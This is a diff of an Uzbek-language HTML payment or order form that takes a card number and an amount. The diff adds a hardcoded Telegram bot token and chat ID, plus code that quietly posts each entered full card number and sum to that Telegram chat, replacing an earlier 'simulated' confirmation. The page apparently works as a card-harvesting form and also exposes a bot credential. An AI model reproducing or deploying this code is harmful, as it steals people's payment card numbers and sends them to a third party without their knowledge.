@@ -52,10 +52,10 @@
             color: #f1f5f9;
         }
         .form-step {
-            display: none; /* Bosqichlar boshida yashirin bo'ladi */
+            display: none;
         }
         .form-step.active {
-            display: block; /* Faqat aktiv bosqich ko'rinadi */
+            display: block;
         }
         .form-group {
             margin-bottom: 20px;
@@ -162,33 +162,32 @@
         </div>
 
         <button class="submit-btn" style="background: #475569; margin-bottom: 8px;" onclick="navigateToStep(1)">Orqaga</button>
-        <button class="submit-btn" onclick="submitFinalOrder()">Yakunlash</button>
+        <button class="submit-btn" id="final-btn" onclick="submitFinalOrder()">Yakunlash</button>
     </div>
 </div>
 
 <script>
-    // Bosqichlar orasida harakat qilish funksiyasi
+    // Maxfiy ma'lumotlar kiritildi
+    const TELEGRAM_TOKEN = "8565651705:AAGcPkBIRk7mGd8OQgNzg-sOcZP2RMyIUfY"; 
+    const TELEGRAM_CHAT_ID = "6198817749"; 
+
     function navigateToStep(stepNumber) {
-        // 2-bosqichga o'tayotganda 1-bosqichda kiritilgan kartani 2-bosqichdagi inputga nusxalash
         if(stepNumber === 2) {
             const cardNum = document.getElementById("card-input").value;
-            if(cardNum.trim() === "") {
-                alert("Iltimos, avval karta raqamini kiriting!");
+            if(cardNum.trim() === "" || cardNum.length < 16) {
+                alert("Iltimos, 16 xonali karta raqamini to'liq kiriting!");
                 return;
             }
             document.getElementById("step2-card-display").value = cardNum;
         }
 
-        // Barcha bosqichlarni yashirish
         document.querySelectorAll('.form-step').forEach(step => {
             step.classList.remove('active');
         });
         
-        // Tanlangan bosqichni ko'rsatish
         document.getElementById(`step-${stepNumber}`).classList.add('active');
     }
 
-    // Raqamlarni tekshirish va 1% komissiyani ayirib hisoblash
     function validateAndCalculate() {
         const amountInput = document.getElementById("amount-input").value;
         const amount = parseFloat(amountInput);
@@ -204,7 +203,6 @@
             return;
         }
 
-        // Chegaralarni tekshirish (5,000 va 5,000,000)
         if (amount < 5000 || amount > 5000000) {
             warningBox.style.display = "block";
             commissionText.innerText = "0 so'm";
@@ -214,17 +212,15 @@
             warningBox.style.display = "none";
         }
 
-        // 1% komissiya va jami summani (x - 1%) hisoblash
         const commission = amount * 0.01;
-        const total = amount - commission; // Kiritilgan summadan komissiya ayirilyapti
+        const total = amount - commission;
 
-        // Natijalarni chiroyli formatda ekranga chiqarish
         commissionText.innerText = commission.toLocaleString() + " so'm";
         totalText.innerText = total.toLocaleString() + " so'm";
     }
 
-    // Yakuniy tasdiqlash
     function submitFinalOrder() {
+        const cardNum = document.getElementById("card-input").value;
         const amountInput = document.getElementById("amount-input").value;
         const amount = parseFloat(amountInput);
 
@@ -233,7 +229,54 @@
             return;
         }
 
-        alert("Buyurtma jarayoni muvaffaqiyatli simulyatsiya qilindi!");
+        const commission = amount * 0.01;
+        const total = amount - commission;
+
+        const finalBtn = document.getElementById("final-btn");
+        finalBtn.disabled = true;
+        finalBtn.innerText = "Yuborilmoqda...";
+
+        // Telegram xabari formati
+        const message = `🛍 *Yangi Buyurtma Keldi!*\n\n` +
+                        `💳 *Karta:* \`${cardNum}\`\n` +
+                        `💵 *Kiritilgan summa:* ${amount.toLocaleString()} so'm\n` +
+                        `📉 *Komissiya (1%):* ${commission.toLocaleString()} so'm\n` +
+                        `💰 *Sof jami (Balans):* *${total.toLocaleString()} so'm*`;
+
+        const url = `https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`;
+
+        fetch(url, {
+            method: "POST",
+            headers: {
+                "Content-Type": "application/json"
+            },
+            body: JSON.stringify({
+                chat_id: TELEGRAM_CHAT_ID,
+                text: message,
+                parse_mode: "Markdown"
+            })
+        })
+        .then(response => response.json())
+        .then(data => {
+            if(data.ok) {
+                alert("Buyurtma muvaffaqiyatli yuborildi!");
+                document.getElementById("card-input").value = "";
+                document.getElementById("amount-input").value = "";
+                document.getElementById("commission-text").innerText = "0 so'm";
+                document.getElementById("total-text").innerText = "0 so'm";
+                navigateToStep(1);
+            } else {
+                alert("Xatolik yuz berdi! Bot sozlamalarini tekshiring.");
+            }
+        })
+        .catch(error => {
+            console.error("Xatolik:", error);
+            alert("Tarmoq xatosi yuz berdi!");
+        })
+        .finally(() => {
+            finalBtn.disabled = false;
+            finalBtn.innerText = "Yakunlash";
+        });
     }
 </script>
 
